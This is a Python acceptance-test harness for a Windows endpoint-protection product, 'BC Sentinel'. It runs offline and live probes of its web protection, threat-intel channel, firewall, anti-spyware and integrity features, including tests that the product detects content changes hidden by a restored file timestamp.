    detail = (
        "PID-scoped DNS correlation + signed domain IOC recommendation + bounded phishing heuristics; "
        "MITM HTTPS disabled and heuristics cannot auto-block"
        if ok else str(result)
    )
    return _check(
        "web-protection-v072-beta1-foundation",
        "pass" if ok else "fail", detail, critical=True,
    )


def _live_v072_beta1_web_protection_probe() -> dict:
    client = ProtectionServiceClient(timeout=2.0)
    status = client.web_status()
    ok = bool(
        isinstance(status, dict)
        and status.get("mode") in {"observe_recommend", "active_reversible"}
        and status.get("dns_etw") is True
        and status.get("pid_scoped_dns") is True
        and status.get("mitm_https") is False
        and status.get("auto_block") is False
    )
    return _check(
        "web-protection-v072-beta1-live",
        "pass" if ok else "fail",
        (f"mode={status.get('mode')}; dns_etw={status.get('dns_etw')}; "
         f"pid_scoped_dns={status.get('pid_scoped_dns')}; domain_iocs={status.get('domain_iocs')}; "
         f"mitm_https={status.get('mitm_https')}; auto_block={status.get('auto_block')}")
        if isinstance(status, dict) else client.last_error or "Web Protection status unavailable",
        critical=True,
    )


def _v072_beta2_web_response_probe() -> dict:
    result = run_web_threat_response_acceptance(service_live=False)
    ok = bool(result.get("passed"))
    shared = result.get("shared_guard") or {}
    detail = (
        "persistent web findings + second-check reversible containment + shared/CDN IP fail-closed guard"
        if ok else str(result)
    )
    return _check(
        "web-response-v072-beta2-foundation",
        "pass" if ok else "fail", detail, critical=True,
    )


def _live_v072_beta2_web_response_probe() -> dict:
    result = run_web_threat_response_acceptance(service_live=True)
    status = result.get("service") or {}
    ok = bool(result.get("passed"))
    return _check(
        "web-response-v072-beta2-live",
        "pass" if ok else "fail",
        (f"mode={status.get('mode')}; dns_etw={status.get('dns_etw')}; pid_scoped_dns={status.get('pid_scoped_dns')}; "
         f"shared_ip_guard={status.get('shared_ip_guard')}; actionable_findings={status.get('actionable_findings')}; "
         f"mitm_https={status.get('mitm_https')}; auto_block={status.get('auto_block')}")
        if isinstance(status, dict) else str(result),
        critical=True,
    )


def _v072_beta3_domain_trust_probe() -> dict:
    result = run_web_domain_trust_acceptance(service_live=False)
    ok = bool(result.get("passed"))
    precedence = result.get("precedence") or {}
    scope = result.get("scope") or {}
    detail = (
        "exact-domain persistent trust + signed IOC precedence + local reputation provenance + browser context"
        if ok else str(result)
    )
    return _check(
        "web-trust-v072-beta3-foundation",
        "pass" if ok else "fail", detail, critical=True,
    )


def _live_v072_beta3_domain_trust_probe() -> dict:
    result = run_web_domain_trust_acceptance(service_live=True)
    status = result.get("service") or {}
    ok = bool(result.get("passed"))
    return _check(
        "web-trust-v072-beta3-live",
        "pass" if ok else "fail",
        (f"mode={status.get('mode')}; trusted_domains={status.get('trusted_domains')}; "
         f"trust_conflicts={status.get('trust_conflicts')}; exact_only={status.get('domain_trust_exact_only')}; "
         f"ioc_precedence={status.get('signed_ioc_overrides_trust')}; reputation_domains={status.get('reputation_domains')}; "
         f"mitm_https={status.get('mitm_https')}; auto_block={status.get('auto_block')}")
        if isinstance(status, dict) else str(result),
        critical=True,
    )


def _v072_beta4_download_probe() -> dict:
    result = run_web_download_acceptance(service_live=False)
    ok = bool(result.get("passed"))
    download = result.get("download") or {}
    attribution = result.get("attribution_safety") or {}
    detail = (
        "same-PID exact-browser download provenance + independent file verdict + download execution incident evidence"
        if ok else str(result)
    )
    return _check(
        "web-download-v072-beta4-foundation",
        "pass" if ok else "fail", detail, critical=True,
    )


def _live_v072_beta4_download_probe() -> dict:
    result = run_web_download_acceptance(service_live=True)
    status = result.get("service") or {}
    ok = bool(result.get("passed"))
    corr = status.get("download_correlation") if isinstance(status, dict) else {}
    return _check(
        "web-download-v072-beta4-live",
        "pass" if ok else "fail",
        (f"mode={status.get('mode')}; download_tracking={status.get('download_tracking')}; "
         f"tracked_downloads={status.get('tracked_downloads')}; exact_browser={corr.get('browser_exact_classification') if isinstance(corr, dict) else None}; "
         f"origin_only_never_file_malicious={status.get('download_origin_never_overrides_file_verdict')}; "
         f"mitm_https={status.get('mitm_https')}; auto_block={status.get('auto_block')}")
        if isinstance(status, dict) else str(result),
        critical=True,
    )


def _v080_beta1_threat_package_probe() -> dict:
    result = run_threat_package_acceptance(service_live=False)
    ok = bool(result.get("passed"))
    activation = result.get("activation") or {}
    detail = (
        "Ed25519 signed IOC/YARA/advisory packages + staged activation + anti-rollback high-water + LKG rollback"
        if ok else str(result)
    )
    return _check(
        "threat-intel-v080-beta1-foundation",
        "pass" if ok else "fail", detail, critical=True,
    )


def _live_v080_beta1_threat_package_probe() -> dict:
    result = run_threat_package_acceptance(service_live=True)
    status = result.get("service") or {}
    ok = bool(result.get("passed"))
    active = status.get("active") if isinstance(status, dict) else None
    return _check(
        "threat-intel-v080-beta1-live",
        "pass" if ok else "fail",
        (f"channel={status.get('channel')}; signature={status.get('signature')}; "
         f"high_water={status.get('high_water_sequence')}; active_seq={(active or {}).get('sequence') if isinstance(active, dict) else None}; "
         f"staged_activation={status.get('staged_activation')}; lkg_rollback={status.get('last_known_good_rollback')}; "
         f"arbitrary_code_execution={status.get('arbitrary_code_execution')}; behavior_enforcement={status.get('behavior_enforcement')}")
        if isinstance(status, dict) else str(result),
        critical=True,
    )


def _v080_beta2_trust_channel_probe() -> dict:
    result = run_threat_channel_beta2_acceptance(service_live=False)
    ok = bool(result.get("passed"))
    trust = result.get("trust_lifecycle") or {}
    recovery = result.get("activation_recovery") or {}
    retrieval = result.get("secure_retrieval") or {}
    return _check(
        "threat-channel-v080-beta2-foundation",
        "pass" if ok else "fail",
        (f"keyset_high_water={trust.get('high_water_sequence')}; revoked_rejected={trust.get('revoked_key_rejected')}; "
         f"recovery={recovery.get('recovered')}; https_only={retrieval.get('https_only')}; "
         f"certificate_pin={retrieval.get('certificate_pin_required')}; auto_activate={retrieval.get('auto_activate')}")
        if ok else str(result),
        critical=True,
    )


def _live_v080_beta2_trust_channel_probe() -> dict:
    result = run_threat_channel_beta2_acceptance(service_live=True)
    status = result.get("service") or {}
    trust = status.get("trust") if isinstance(status, dict) else {}
    retrieval = status.get("retrieval_policy") if isinstance(status, dict) else {}
    ok = bool(result.get("passed"))
    return _check(
        "threat-channel-v080-beta2-live",
        "pass" if ok else "fail",
        (f"key_rotation={trust.get('key_rotation') if isinstance(trust, dict) else None}; "
         f"key_revocation={trust.get('key_revocation') if isinstance(trust, dict) else None}; "
         f"activation_recovery={status.get('activation_recovery')}; signed_reputation_enforcement={status.get('signed_reputation_enforcement')}; "
         f"https_only={retrieval.get('https_only') if isinstance(retrieval, dict) else None}; "
         f"pin_required={retrieval.get('certificate_pin_required') if isinstance(retrieval, dict) else None}; "
         f"auto_activate={retrieval.get('auto_activate') if isinstance(retrieval, dict) else None}")
        if isinstance(status, dict) else str(result),
        critical=True,
    )


def _v080_beta3_remote_index_probe() -> dict:
    result = run_threat_channel_beta3_acceptance(service_live=False)
    ok = bool(result.get("passed"))
    index = result.get("signed_remote_index") or {}
    retrieval = result.get("controlled_retrieval") or {}
    faults = result.get("fault_matrix") or {}
    return _check(
        "threat-channel-v080-beta3-foundation",
        "pass" if ok else "fail",
        (f"index_high_water={index.get('high_water_sequence')}; index_rollback_rejected={index.get('rollback_rejected')}; "
         f"revoked_signer_skipped={retrieval.get('revoked_signer_skipped')}; cache={retrieval.get('content_addressed_cache')}; "
         f"auto_activate={retrieval.get('auto_activate')}; mixed_state={faults.get('mixed_state_observed')}")
        if ok else str(result),
        critical=True,
    )


def _live_v080_beta3_remote_index_probe() -> dict:
    result = run_threat_channel_beta3_acceptance(service_live=True)
    status = result.get("service") or {}
    remote_index = status.get("remote_index") if isinstance(status, dict) else {}
    remote_cache = status.get("remote_cache") if isinstance(status, dict) else {}
    scheduler = status.get("scheduler") if isinstance(status, dict) else {}
    policy = status.get("remote_channel_policy") if isinstance(status, dict) else {}
    revocation = status.get("revocation_policy") if isinstance(status, dict) else {}
    ok = bool(result.get("passed"))
    return _check(
        "threat-channel-v080-beta3-live",
        "pass" if ok else "fail",
        (f"signed_index={remote_index.get('signature') if isinstance(remote_index, dict) else None}; "
         f"index_anti_rollback={remote_index.get('anti_rollback') if isinstance(remote_index, dict) else None}; "
         f"content_cache={remote_cache.get('content_addressed') if isinstance(remote_cache, dict) else None}; "
         f"scheduler_auto_activate={scheduler.get('auto_activate') if isinstance(scheduler, dict) else None}; "
         f"remote_auto_activate={policy.get('auto_activate') if isinstance(policy, dict) else None}; "
         f"revocation_fail_open={revocation.get('fail_open') if isinstance(revocation, dict) else None}")
        if isinstance(status, dict) else str(result),
        critical=True,
    )


def _v080_rc1_consolidation_probe() -> dict:
    result = run_release_candidate_acceptance(service_live=False)
    consolidation = result.get("consolidation") or {}
    regressions = result.get("regression_gates") or {}
    ok = bool(result.get("passed"))
    return _check(
        "release-v080-rc1-foundation",
        "pass" if ok else "fail",
        (f"version_order={consolidation.get('version_order_valid')}; docs={consolidation.get('required_docs_present')}; "
         f"private_keys_absent={consolidation.get('private_key_markers_absent')}; beta1={regressions.get('threat_package_beta1')}; "
         f"beta2={regressions.get('threat_channel_beta2')}; beta3={regressions.get('threat_channel_beta3')}")
        if ok else str(result),
        critical=True,
    )


def _live_v080_rc1_consolidation_probe() -> dict:
    result = run_release_candidate_acceptance(service_live=True)
    service = result.get("service") or {}
    ok = bool(result.get("passed"))
    return _check(
        "release-v080-rc1-live",
        "pass" if ok else "fail",
        (f"remote_auto_stage={service.get('remote_auto_stage')}; remote_auto_activate={service.get('remote_auto_activate')}; "
         f"cloud_required={service.get('cloud_required')}; scheduler_auto_activate={service.get('scheduler_auto_activate')}; "
         f"https_only={service.get('https_only')}; pin_required={service.get('certificate_pin_required')}")
        if ok else str(result),
        critical=True,
    )


def _v090_beta1_antispyware_probe() -> dict:
    result = run_antispyware_acceptance(service_live=False)
    coverage = result.get("coverage") or {}
    safety = result.get("safety") or {}
    native = result.get("native_inventory_probe") or {}
    ok = bool(result.get("passed"))
    return _check(
        "antispyware-v090-beta1-foundation",
        "pass" if ok else "fail",
        (f"coverage={sum(1 for v in coverage.values() if v)}/8; native_inventory={native.get('completed')}; "
         f"auto_registry_delete={safety.get('automatic_registry_delete')}; single_signal_malware={safety.get('single_persistence_signal_is_malware')}")
        if ok else str(result),
        critical=True,
    )


def _live_v090_beta1_antispyware_probe() -> dict:
    result = run_antispyware_acceptance(service_live=True)
    service = result.get("service") or {}
    ok = bool(result.get("passed"))
    return _check(
        "antispyware-v090-beta1-live",
        "pass" if ok else "fail",
        (f"running={service.get('running')}; supported={service.get('supported')}; mode={service.get('mode')}; "
         f"auto_destructive={service.get('automatic_destructive_action')}; multi_signal={service.get('multi_signal_correlation')}; "
         f"findings={result.get('service_findings_returned')}")
        if ok else str(result),
        critical=True,
    )


def _v090_beta2_remediation_probe() -> dict:
    result = run_antispyware_remediation_acceptance(service_live=False)
    plan = result.get("reversible_plan") or {}
    safety = result.get("safety") or {}
    pup = result.get("pup_adware") or {}
    native = result.get("native_registry_probe") or {}
    ok = bool(result.get("passed"))
    return _check(
        "antispyware-v090-beta2-foundation",
        "pass" if ok else "fail",
        (f"plan_applied={plan.get('applied')}; restored={plan.get('restored')}; tamper={safety.get('tamper_rejected')}; "
         f"race={safety.get('race_rejected')}; pup={pup.get('candidate')}; native_registry={native.get('restored')}; auto_action={plan.get('automatic_action')}")
        if ok else str(result),
        critical=True,
    )


def _live_v090_beta2_remediation_probe() -> dict:
    result = run_antispyware_remediation_acceptance(service_live=True)
    service = result.get("service") or {}
    remediation = service.get("remediation") or {}
    ok = bool(result.get("passed"))
    return _check(
        "antispyware-v090-beta2-live",
        "pass" if ok else "fail",
        (f"mode={remediation.get('mode')}; explicit_approval={remediation.get('explicit_approval_required')}; "
         f"hmac={remediation.get('plan_integrity')}; anti_race={remediation.get('anti_race_snapshot_verification')}; "
         f"auto_remediation={remediation.get('automatic_remediation')}; process_termination={remediation.get('service_process_termination')}")
        if ok else str(result),
        critical=True,
    )


def _v090_beta3_advanced_antimalware_probe() -> dict:
    result = run_advanced_antimalware_acceptance(service_live=False)
    multi = result.get("multi_signal_fileless") or {}
    single = result.get("single_lolbin") or {}
    temporal = result.get("temporal_network_chain") or {}
    ok = bool(result.get("passed"))
    return _check(
        "antimalware-v090-beta3-foundation",
        "pass" if ok else "fail",
        (f"single_below_high={single.get('below_high')}; multi_high={multi.get('qualified_high')}; "
         f"network_chain={temporal.get('network_correlated')}; process_chain={temporal.get('process_chain_correlated')}; "
         f"auto_destructive={multi.get('automatic_destructive_action')}") if ok else str(result),
        critical=True,
    )


def _live_v090_beta3_advanced_antimalware_probe() -> dict:
    result = run_advanced_antimalware_acceptance(service_live=True)
    service = result.get("service") or {}
    ok = bool(result.get("passed"))
    return _check(
        "antimalware-v090-beta3-live",
        "pass" if ok else "fail",
        (f"mode={service.get('mode')}; powershell={service.get('powershell_analysis')}; "
         f"lolbin={service.get('lolbin_analysis')}; chain={service.get('process_chain_correlation')}; "
         f"single_high={service.get('single_evidence_high_allowed')}; auto_kill={service.get('automatic_process_termination')}")
        if ok else str(result),
        critical=True,
    )



def _v090_rc1_release_probe() -> dict:
    result = run_v090_release_candidate_acceptance(service_live=False)
    fp = result.get("false_positive_hardening") or {}
    regressions = result.get("regression_gates") or {}
    ok = bool(result.get("passed"))
    return _check(
        "release-v090-rc1-foundation",
        "pass" if ok else "fail",
        (
            f"regressions={sum(1 for value in regressions.values() if value)}/{len(regressions)}; "
            f"benign_below_high={fp.get('all_benign_cases_below_high')}; "
            f"routine_safe={fp.get('routine_admin_cases_safe')}; "
            f"strong_detection={fp.get('strong_detection_retained')}"
        ) if ok else str(result),
        critical=True,
    )


def _live_v090_rc1_release_probe() -> dict:
    result = run_v090_release_candidate_acceptance(service_live=True)
    service = result.get("service") or {}
    ok = bool(result.get("passed"))
    return _check(
        "release-v090-rc1-live",
        "pass" if ok else "fail",
        (
            f"health={service.get('health')}; transport={service.get('transport')}; "
            f"beta1={service.get('beta1_live')}; beta2={service.get('beta2_live')}; "
            f"beta3={service.get('beta3_live')}; auto_destructive={service.get('automatic_destructive_action')}"
        ) if ok else str(result),
        critical=True,
    )



def _v010_beta1_web_deception_probe() -> dict:
    result = run_v010_web_deception_acceptance(service_live=False)
    safety = result.get("safety") or {}
    ok = bool(result.get("passed"))
    return _check(
        "web-reputation-v010-beta1-foundation",
        "pass" if ok else "fail",
        (
            f"profile={result.get('profile')}; cap={safety.get('heuristic_score_cap')}; "
            f"below_high={safety.get('all_heuristics_below_high')}; typo={safety.get('typosquat_detected')}; "
            f"identity={safety.get('declared_identity_separated')}; fp={safety.get('enterprise_false_positive_matrix_green')}; "
            f"signed_precedence={safety.get('signed_ioc_precedence')}; signed_over_trust={safety.get('signed_ioc_overrides_exact_trust')}; "
            f"mitm={safety.get('mitm_https')}"
        ) if ok else str(result),
        critical=True,
    )


def _live_v010_beta1_web_deception_probe() -> dict:
    result = run_v010_web_deception_acceptance(service_live=True)
    service = result.get("service") or {}
    status = service.get("status") if isinstance(service.get("status"), dict) else service
    ok = bool(result.get("passed"))
    return _check(
        "web-reputation-v010-beta1-live",
        "pass" if ok else "fail",
        (
            f"profile={status.get('deception_profile')}; cap={status.get('heuristic_score_cap')}; "
            f"single_high={status.get('heuristic_can_qualify_high')}; auto_block={status.get('auto_block')}; "
            f"download_verdict_guard={status.get('download_origin_never_overrides_file_verdict')}; "
            f"mitm={status.get('mitm_https')}"
        ) if ok else str(result),
        critical=True,
    )

def _live_v071_beta3_ioc_probe() -> dict:
    client = ProtectionServiceClient(timeout=2.0)
    status = client.status() or {}
    ioc = status.get("ioc") if isinstance(status, dict) else None
    ok = isinstance(ioc, dict) and "installed" in ioc and "active_entries" in ioc
    return _check(
        "ioc-v071-beta3-live", "pass" if ok else "fail",
        f"installed={ioc.get('installed')}; sequence={ioc.get('sequence')}; active_entries={ioc.get('active_entries')}; expired={ioc.get('expired')}" if ok else client.last_error or "IOC subsystem status unavailable",
        critical=True,
    )


def _live_v071_beta3_containment_probe() -> dict:
    client = ProtectionServiceClient(timeout=2.0)
    status = client.status() or {}
    containment = status.get("containment") if isinstance(status, dict) else None
    try:
        active = int((containment or {}).get("active_leases"))
        ok = active >= 0
    except Exception:
        active = -1
        ok = False
    return _check(
        "containment-v071-beta3-live", "pass" if ok else "fail",
        f"active_leases={active}" if ok else client.last_error or "containment subsystem status unavailable",
        critical=True,
    )


def _live_firewall_v071_drift_probe() -> dict:
    client = ProtectionServiceClient(timeout=2.0)
    drift = client.firewall_drift()
    if not isinstance(drift, dict):
        return _check("firewall-v071-drift-live", "fail", client.last_error or "firewall drift status unavailable", critical=True)
    ok = bool(drift.get("ok")) and not drift.get("collisions")
    return _check(
        "firewall-v071-drift-live", "pass" if ok else "fail",
        f"expected={drift.get('expected_rules')}; observed={drift.get('observed_owned_rules')}; reconcilable={drift.get('reconcilable')}; collisions={drift.get('collisions')}; issues={len(drift.get('issues') or [])}",
        critical=True,
    )


def _live_firewall_v071_beta2_conflict_probe() -> dict:
    client = ProtectionServiceClient(timeout=2.0)
    conflicts = client.firewall_conflicts()
    if not isinstance(conflicts, dict):
        return _check("firewall-v071-beta2-conflicts-live", "fail", client.last_error or "firewall conflict status unavailable", critical=True)
    ok = bool(conflicts.get("ok")) and int(conflicts.get("blocking_count") or 0) == 0
    return _check(
        "firewall-v071-beta2-conflicts-live",
        "pass" if ok else "fail",
        f"blocking={conflicts.get('blocking_count')}; advisories={conflicts.get('advisory_count')}; expected={conflicts.get('expected_rules')}",
        critical=True,
    )


def _live_abuse_protection_probe() -> dict:
    client = ProtectionServiceClient(timeout=2.0)
    status = client.status() or {}
    abuse = status.get("abuse_protection") if isinstance(status, dict) else None
    ok = isinstance(abuse, dict) and "request_rate_limiter" in abuse and "invalid_message_limiter" in abuse
    return _check(
        "protection-v071-beta2-abuse-live",
        "pass" if ok else "fail",
        f"metrics={abuse}" if ok else client.last_error or "abuse protection metrics unavailable",
        critical=True,
    )


def _live_firewall_probe() -> dict:
    client = ProtectionServiceClient(timeout=2.0)
    firewall = client.firewall_status()
    if not isinstance(firewall, dict):
        return _check("firewall-v070-live", "fail", client.last_error or "firewall status unavailable", critical=True)
    ok = (
        bool(firewall.get("available"))
        and str(firewall.get("mode")) == "windows_firewall_com"
        and str(firewall.get("managed_group")) == MANAGED_FIREWALL_GROUP
        and firewall.get("global_policy_modified") is False
        and firewall.get("enforcement_ready") is True
    )
    return _check(
        "firewall-v070-live", "pass" if ok else "fail",
        f"mode={firewall.get('mode')}; managed_rules={firewall.get('managed_rules')}; profiles={firewall.get('system_firewall')}; policy={firewall.get('local_policy_modify_state')}; enforcement_ready={firewall.get('enforcement_ready')}; global_policy_modified={firewall.get('global_policy_modified')}",
        critical=True,
    )


def _live_protection_service_probe() -> dict:
    client=ProtectionServiceClient(timeout=1.5)
    if not client.service_installed():
        return _check("protection-service-live","fail","BCSentinelProtection is not installed",critical=True)
    status=client.status()
    if not status:
        return _check("protection-service-live","fail",client.last_error or "service is installed but IPC is unavailable",critical=True)
    health=str(status.get("health") or "")
    if health not in {"HEALTHY","DEGRADED"}:
        return _check("protection-service-live","fail",f"unexpected service health: {health}; {status}",critical=True)
    return _check(
        "protection-service-live","pass",
        f"health={health}; pid={status.get('pid')}; transport={status.get('transport')}",critical=True,
    )

def _live_service_hardening_probe() -> dict:
    client=ProtectionServiceClient(timeout=2.0)
    hardening=client.hardening_status()
    if not isinstance(hardening,dict):
        return _check("protection-hardening-live","fail",client.last_error or "hardening status unavailable",critical=True)
    required=[
        bool(hardening.get("ok")),
        str(hardening.get("mode"))=="sealed",
        bool((hardening.get("integrity") or {}).get("ok")),
        bool((hardening.get("integrity") or {}).get("manifest_authenticated")),
        bool((hardening.get("config") or {}).get("ok")),
        bool(((hardening.get("acl") or {}).get("install") or {}).get("ok")),
        bool(((hardening.get("acl") or {}).get("data") or {}).get("ok")),
        bool(((hardening.get("acl") or {}).get("integrity_key") or {}).get("ok")),
        bool((hardening.get("scm") or {}).get("ok")),
        bool((hardening.get("audit") or {}).get("ok")),
    ]
    if not all(required):
        return _check("protection-hardening-live","fail",f"hardening posture not sealed/healthy: {hardening}",critical=True)
    return _check(
        "protection-hardening-live","pass",
        f"sealed; manifest authenticated; ACL/SCM/config/audit verified; audit_records={(hardening.get('audit') or {}).get('records')}",
        critical=True,
    )


def _live_privileged_broker_probe() -> dict:
    client = ProtectionServiceClient(timeout=2.0)
    status = client.status()
    if not isinstance(status, dict):
        return _check("protection-uac-broker-live", "fail", client.last_error or "service status unavailable", critical=True)
    broker = status.get("privileged_broker") or {}
    expected = client.installed_broker_path()
    ok = (
        broker.get("mode") == "one_action_uac"
        and float(broker.get("ttl_seconds") or 0) > 0
        and expected.is_file()
        and not is_reparse_point(expected)
    )
    return _check(
        "protection-uac-broker-live",
        "pass" if ok else "fail",
        f"mode={broker.get('mode')}; broker={expected}; completed={broker.get('completed')}; rejected={broker.get('rejected')}",
        critical=True,
    )


def _scanner_timestamp_evasion_probe(root: Path, db: Database) -> dict:
    settings = Settings.defaults()
    settings.exclude_self = False
    settings.reputation_enabled = False
    scanner = StaticScanner(settings, db=db)
    sample = root / "timestamp_evasion.cmd"
    first_bytes = b"@echo off\nrem version-A-0000\n"
    second_bytes = b"@echo off\nrem version-B-0000\n"
    if len(first_bytes) != len(second_bytes):
        return _check("timestamp-restoration-evasion", "fail", "internal probe length mismatch", critical=True)
    sample.write_bytes(first_bytes)
    before = sample.stat()
    first = scanner.scan_file(sample)
    sample.write_bytes(second_bytes)
    os.utime(sample, ns=(before.st_atime_ns, before.st_mtime_ns))
    second = scanner.scan_file(sample)
    if first.sha256 == second.sha256 or second.hashes_cached:
        return _check(
            "timestamp-restoration-evasion", "fail",
            "executable content change reused stale identity", critical=True,
        )
    return _check(
        "timestamp-restoration-evasion", "pass",
        "same-size/same-mtime executable was re-hashed", critical=True,
    )



def _integrity_timestamp_evasion_probe(root: Path) -> dict:
    probe_root = root / "integrity_timestamp_evasion"
    probe_root.mkdir(exist_ok=True)
    sample = probe_root / "service.dll"
    first_bytes = b"AAAA"
    second_bytes = b"BBBB"
    sample.write_bytes(first_bytes)
    write_integrity_manifest(probe_root)
    verifier = IntegrityVerifier(
        probe_root,
        key_path=root / "integrity-probe.key",
        signature_path=root / "integrity-probe.sig",
    )
    sealed = verifier.seal()
    if not sealed.ok:
        return _check(
            "protection-integrity-timestamp-evasion", "fail",
            f"probe could not seal manifest: {sealed.issues}", critical=True,
        )
    before = sample.stat()
    if not verifier.verify(full=False).ok:
        return _check(
            "protection-integrity-timestamp-evasion", "fail",
            "baseline incremental verification failed", critical=True,
        )
    sample.write_bytes(second_bytes)
    os.utime(sample, ns=(before.st_atime_ns, before.st_mtime_ns))
    result = verifier.verify(full=False)
    if result.ok or not any("hash mismatch" in issue for issue in result.issues):
        return _check(
            "protection-integrity-timestamp-evasion", "fail",
            "same-size/same-mtime protected-file change reused stale integrity identity",
            critical=True,
        )
    return _check(
        "protection-integrity-timestamp-evasion", "pass",
        f"restored-mtime tamper detected; checked_files={result.checked_files}",
        critical=True,
    )

def run_acceptance(*, benchmark_files: int, realtime_seconds: float, service_live: bool = False) -> dict:
    result = {
        "product": "BC Sentinel",
        "version": APP_VERSION,
        "platform": platform.platform(),
        "python": sys.version.split()[0],
        "is_windows": os.name == "nt",
        "is_admin": _is_admin(),
        "checks": [],
        "benchmark": {},
    }
    checks = result["checks"]

    if os.name != "nt":
        checks.append(_check(
            "target-platform", "fail",
            "This acceptance harness must be executed on the target Windows machine.",
            critical=True,
        ))
        result["passed"] = False
        return result

    checks.append(_check("target-platform", "pass", platform.platform(), critical=True))
    checks.extend([
        _module_check("PySide6", critical=True),
        _module_check("watchdog", critical=True),
        _module_check("psutil", critical=True),
        _module_check("cryptography", critical=True),
        _module_check("yara", critical=True),
        _module_check("etw", critical=True),
        _module_check("win32service", critical=False),
    ])
    checks.append(_check(
        "administrator-context",
        "pass" if result["is_admin"] else "warn",
        "administrator" if result["is_admin"] else "not elevated; ETW/service checks may fail",
    ))

    with tempfile.TemporaryDirectory(prefix="bcs-v060-acceptance-") as tmp:
        root = Path(tmp)
        db = Database(root / "acceptance.sqlite")
        checks.append(_scanner_timestamp_evasion_probe(root, db))
        checks.append(_integrity_timestamp_evasion_probe(root))
        checks.append(_reparse_probe(root))
        checks.append(_authenticode_probe())
        watch_root = root / "watch"
        watch_root.mkdir(exist_ok=True)
        checks.append(_watchdog_probe(watch_root, db))
        checks.append(_etw_probe())
        checks.append(_network_probe(root, db))
        checks.append(_behavioral_correlation_probe())
        checks.append(_incident_response_probe(db))
        checks.extend(_protection_service_foundation_probe())
        checks.append(_firewall_foundation_probe())
        checks.append(_firewall_v071_drift_probe())
        checks.extend(_v071_beta2_security_probe())
        checks.extend(_v071_beta3_security_probe())
        checks.append(_v072_beta1_web_protection_probe())
        checks.append(_v072_beta2_web_response_probe())
        checks.append(_v072_beta3_domain_trust_probe())
        checks.append(_v072_beta4_download_probe())
        checks.append(_v080_beta1_threat_package_probe())
        checks.append(_v080_beta2_trust_channel_probe())
        checks.append(_v080_beta3_remote_index_probe())
        checks.append(_v080_rc1_consolidation_probe())
        checks.append(_v090_beta1_antispyware_probe())
        checks.append(_v090_beta2_remediation_probe())
        checks.append(_v090_beta3_advanced_antimalware_probe())
        checks.append(_v090_rc1_release_probe())
        checks.append(_v010_beta1_web_deception_probe())
        if service_live:
            checks.append(_live_protection_service_probe())
            checks.append(_live_service_hardening_probe())
            checks.append(_live_privileged_broker_probe())
            checks.append(_live_firewall_probe())
            checks.append(_live_firewall_v071_drift_probe())
            checks.append(_live_firewall_v071_beta2_conflict_probe())
            checks.append(_live_abuse_protection_probe())
            checks.append(_live_v071_beta3_ioc_probe())
            checks.append(_live_v071_beta3_containment_probe())
            checks.append(_live_v072_beta1_web_protection_probe())
            checks.append(_live_v072_beta2_web_response_probe())
            checks.append(_live_v072_beta3_domain_trust_probe())
            checks.append(_live_v072_beta4_download_probe())
            checks.append(_live_v080_beta1_threat_package_probe())
            checks.append(_live_v080_beta2_trust_channel_probe())
            checks.append(_live_v080_beta3_remote_index_probe())
            checks.append(_live_v080_rc1_consolidation_probe())
            checks.append(_live_v090_beta1_antispyware_probe())
            checks.append(_live_v090_beta2_remediation_probe())
            checks.append(_live_v090_beta3_advanced_antimalware_probe())
            checks.append(_live_v090_rc1_release_probe())
            checks.append(_live_v010_beta1_web_deception_probe())

        corpus = root / "benchmark"
        make_corpus(corpus, max(1, benchmark_files), 256)
        scan_pair = scan_benchmark(corpus, db)
        robust = scan_benchmark_median(corpus, db, runs=3, first_pair=scan_pair)
        result["benchmark"] = {
            **scan_pair,
            "scan_median_3": robust,
            "realtime": realtime_benchmark(corpus, db, realtime_seconds),
        }
        perf_ok = float(robust.get("speedup_from_medians") or 0.0) >= 1.0 and float(robust.get("warm_hash_cache_hit_ratio_median") or 0.0) >= 0.95
        checks.append(_check(
            "performance-v072-beta2-median",
            "pass" if perf_ok else "warn",
            f"3-run median warm speedup={robust.get('speedup_from_medians')}x; cache_hit_ratio={robust.get('warm_hash_cache_hit_ratio_median')}; cold_range={robust.get('cold_elapsed_range_seconds')}; warm_range={robust.get('warm_elapsed_range_seconds')}",
            critical=False,
        ))

    critical_failures = [c for c in checks if c["critical"] and c["status"] == "fail"]
    result["passed"] = not critical_failures
    result["critical_failures"] = [c["name"] for c in critical_failures]
    return result


def main() -> int:
    parser = argparse.ArgumentParser(
        description="BC Sentinel v0.7.2 Beta 4 safe Windows acceptance harness"
    )
    parser.add_argument("--benchmark-files", type=int, default=2000)
    parser.add_argument("--realtime-seconds", type=float, default=2.0)
    parser.add_argument("--output", type=Path)
    parser.add_argument(
        "--service-live", action="store_true",
        help="Also require an already-installed BCSentinelProtection service and named-pipe health check.",
    )
    args = parser.parse_args()

    result = run_acceptance(
        benchmark_files=max(1, args.benchmark_files),
        realtime_seconds=max(0.5, args.realtime_seconds),
        service_live=bool(args.service_live),
    )
    text = json.dumps(result, indent=2, ensure_ascii=False)
    print(text)
    if args.output:
        args.output.write_text(text + "\n", encoding="utf-8")
    return 0 if result.get("passed") else 2


if __name__ == "__main__":
    raise SystemExit(main())
